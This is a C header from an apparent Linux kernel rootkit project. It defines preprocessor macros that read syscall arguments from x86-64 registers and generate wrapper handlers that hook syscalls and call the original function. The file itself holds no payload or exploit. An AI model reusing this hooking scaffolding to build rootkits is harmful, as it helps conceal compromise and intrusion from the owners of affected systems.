#ifndef _ROOTKIT_MACRO_UTILS_H_
#define _ROOTKIT_MACRO_UTILS_H_

#include <asm/ptrace.h>
#include <linux/linkage.h>
#include <linux/syscalls.h>


// MAP macro taken from https://github.com/swansontec/map-macro

#define __MAPX_EVAL0(...) __VA_ARGS__
#define __MAPX_EVAL1(...) __MAPX_EVAL0(__MAPX_EVAL0(__MAPX_EVAL0(__VA_ARGS__)))
#define __MAPX_EVAL2(...) __MAPX_EVAL1(__MAPX_EVAL1(__MAPX_EVAL1(__VA_ARGS__)))
#define __MAPX_EVAL3(...) __MAPX_EVAL2(__MAPX_EVAL2(__MAPX_EVAL2(__VA_ARGS__)))
#define __MAPX_EVAL4(...) __MAPX_EVAL3(__MAPX_EVAL3(__MAPX_EVAL3(__VA_ARGS__)))
#define __MAPX_EVAL(...)  __MAPX_EVAL4(__MAPX_EVAL4(__MAPX_EVAL4(__VA_ARGS__)))

#define __MAPX_END(...)
#define __MAPX_OUT
#define __MAPX_COMMA ,

#define __MAPX_GET_END2()             0, __MAPX_END
#define __MAPX_GET_END1(...)          __MAPX_GET_END2
#define __MAPX_GET_END(...)           __MAPX_GET_END1
#define __MAPX_NEXT0(test, next, ...) next __MAPX_OUT
#define __MAPX_NEXT1(test, next)      __MAPX_NEXT0(test, next, 0)
#define __MAPX_NEXT(test, next)       __MAPX_NEXT1(__MAPX_GET_END test, next)

#define __MAPX0(f, x, peek, ...) f(x) __MAPX_NEXT(peek, __MAPX1)(f, peek, __VA_ARGS__)
#define __MAPX1(f, x, peek, ...) f(x) __MAPX_NEXT(peek, __MAPX0)(f, peek, __VA_ARGS__)

#define __MAPX_LIST_NEXT1(test, next) __MAPX_NEXT0(test, __MAPX_COMMA next, 0)
#define __MAPX_LIST_NEXT(test, next)  __MAPX_LIST_NEXT1(__MAPX_GET_END test, next)

#define __MAPX_LIST0(f, x, peek, ...) \
    f(x) __MAPX_LIST_NEXT(peek, __MAPX_LIST1)(f, peek, __VA_ARGS__)
#define __MAPX_LIST1(f, x, peek, ...) \
    f(x) __MAPX_LIST_NEXT(peek, __MAPX_LIST0)(f, peek, __VA_ARGS__)

/**
 * Applies the function macro `f` to each of the remaining parameters.
 */
#define __MAPX(f, ...) __MAPX_EVAL(__MAPX1(f, __VA_ARGS__, ()()(), ()()(), ()()(), 0))

/**
 * Applies the function macro `f` to each of the remaining parameters and
 * inserts commas between the results.
 */
#define __MAPX_LIST(f, ...) __MAPX_EVAL(__MAPX_LIST1(f, __VA_ARGS__, ()()(), ()()(), ()()(), 0))


// Macros for syscall hooking

#define __DECL_REG(_reg_var, _reg_name, _var_type, _var_name, ...) \
    _var_type _var_name = ((_var_type)_reg_var->_reg_name);

#define __DECL_REG1(_reg_var, _var_type1, _var_name1) \
    __DECL_REG(_reg_var, di, _var_type1, _var_name1)

#define __DECL_REG2(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2) \
    __DECL_REG1(_reg_var, _var_type1, _var_name1)                             \
    __DECL_REG(_reg_var, si, _var_type2, _var_name2)

#define __DECL_REG3(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3, \
                    _var_name3)                                                           \
    __DECL_REG2(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2)                 \
    __DECL_REG(_reg_var, dx, _var_type3, _var_name3)

#define __DECL_REG4(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3,         \
                    _var_name3, _var_type4, _var_name4)                                           \
    __DECL_REG3(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3, _var_name3) \
    __DECL_REG(_reg_var, r10, _var_type4, _var_name4)

#define __DECL_REG5(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3,         \
                    _var_name3, _var_type4, _var_name4, _var_type5, _var_name5)                   \
    __DECL_REG4(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3, _var_name3, \
                _var_type4, _var_name4)                                                           \
    __DECL_REG(_reg_var, r8, _var_type5, _var_name5)

#define __DECL_REG6(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3,         \
                    _var_name3, _var_type4, _var_name4, _var_type5, _var_name5, _var_type6,       \
                    _var_name6)                                                                   \
    __DECL_REG5(_reg_var, _var_type1, _var_name1, _var_type2, _var_name2, _var_type3, _var_name3, \
                _var_type4, _var_name4, _var_type5, _var_name5)                                   \
    __DECL_REG(_reg_var, r9, _var_type6, _var_name6)

#define __DECL_REGx(x, _reg_var, ...) __DECL_REG##x(_reg_var, __VA_ARGS__)

#define SYSCALL_HOOK_HANDLERx(x, _syscall_name, _orig_sysfun, _reg_var, ...)                     \
    asmlinkage long __do_##_syscall_name##_hook(sysfun_t _orig_sysfun, struct pt_regs *_reg_var, \
                                                __MAP(x, __SC_DECL, __VA_ARGS__));               \
    /*__attribute__((alias(__stringify(HOOK_HANDLER_NAME(_syscall_name)))));*/                   \
    asmlinkage long HOOK_HANDLER_NAME(_syscall_name)(struct pt_regs * _reg_var)                  \
    {                                                                                            \
        __DECL_REGx(x, _reg_var, __VA_ARGS__) return __do_##_syscall_name##_hook(                \
            ORIG_SYSFUN(_syscall_name), _reg_var, __MAP(x, __SC_ARGS, __VA_ARGS__));             \
    }                                                                                            \
    asmlinkage long __do_##_syscall_name##_hook(sysfun_t _orig_sysfun, struct pt_regs *_reg_var, \
                                                __MAP(x, __SC_DECL, __VA_ARGS__))

#define SYSCALL_HOOK_HANDLER1(...) SYSCALL_HOOK_HANDLERx(1, __VA_ARGS__)
#define SYSCALL_HOOK_HANDLER2(...) SYSCALL_HOOK_HANDLERx(2, __VA_ARGS__)
#define SYSCALL_HOOK_HANDLER3(...) SYSCALL_HOOK_HANDLERx(3, __VA_ARGS__)
#define SYSCALL_HOOK_HANDLER4(...) SYSCALL_HOOK_HANDLERx(4, __VA_ARGS__)
#define SYSCALL_HOOK_HANDLER5(...) SYSCALL_HOOK_HANDLERx(5, __VA_ARGS__)
#define SYSCALL_HOOK_HANDLER6(...) SYSCALL_HOOK_HANDLERx(6, __VA_ARGS__)

#define DECLARE_HOOK_HANDLER(_syscall_name) \
    asmlinkage long HOOK_HANDLER_NAME(_syscall_name)(struct pt_regs *);

#define DECLARE_HOOK_HANDLERS(...) __MAPX(DECLARE_HOOK_HANDLER, __VA_ARGS__)

#endif
